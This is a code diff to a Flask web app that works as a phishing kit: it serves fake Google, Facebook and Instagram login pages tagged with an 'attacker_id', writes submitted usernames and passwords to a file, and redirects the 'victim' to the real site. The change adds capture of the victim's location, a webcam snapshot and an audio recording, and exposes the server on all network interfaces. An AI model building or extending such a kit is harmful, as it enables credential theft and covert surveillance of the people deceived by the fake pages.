@@ -1,13 +1,29 @@
 from flask import Flask, request, render_template, redirect, url_for
 import os
+import base64
+from datetime import datetime
 
 app = Flask(__name__)
 
 
-def save_credentials(platform, username, password):
+for folder in ["static/snapshots", "static/audio"]:
+    if not os.path.exists(folder):
+        os.makedirs(folder)
+
+
+def save_data(platform, username, password, latitude=None, longitude=None, snapshot=None, audio=None):
+    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
     with open("credentials.txt", "a") as f:
-        f.write(
-            f"Platform: {platform}, Username: {username}, Password: {password}\n")
+        f.write(f"[{timestamp}] Platform: {platform}, Username: {username}, Password: {password}, "
+                f"Lat: {latitude or 'N/A'}, Lon: {longitude or 'N/A'}\n")
+    if snapshot:
+        snapshot_filename = f"static/snapshots/{timestamp}.png"
+        with open(snapshot_filename, "wb") as img_file:
+            img_file.write(base64.b64decode(snapshot.split(',')[1]))
+    if audio:
+        audio_filename = f"static/audio/{timestamp}.webm"
+        with open(audio_filename, "wb") as audio_file:
+            audio_file.write(base64.b64decode(audio.split(',')[1]))
 
 
 @app.route('/')
@@ -26,7 +42,7 @@ def facebook_login(attacker_id):
 
 
 @app.route('/instagram-login/<attacker_id>')
-def instgram_login(attacker_id):
+def instagram_login(attacker_id):
     return render_template('instagram.html', attacker_id=attacker_id)
 
 
@@ -45,8 +61,15 @@ def submit():
     platform = request.form['platform']
     username = request.form['username']
     password = request.form['password']
-    save_credentials(platform, username, password)
+    latitude = request.form.get('latitude')
+    longitude = request.form.get('longitude')
+    snapshot = request.form.get('snapshot')
+    audio = request.form.get('audio')
 
+    save_data(platform, username, password,
+              latitude, longitude, snapshot, audio)
+
+    # Redirect "victim" to real site
     if platform == "Google":
         return redirect("https://accounts.google.com")
     elif platform == "Facebook":
@@ -55,4 +78,4 @@ def submit():
 
 
 if __name__ == "__main__":
-    app.run(debug=True, host="127.0.0.1", port=5000)
+    app.run(debug=True, host="0.0.0.0", port=5000)
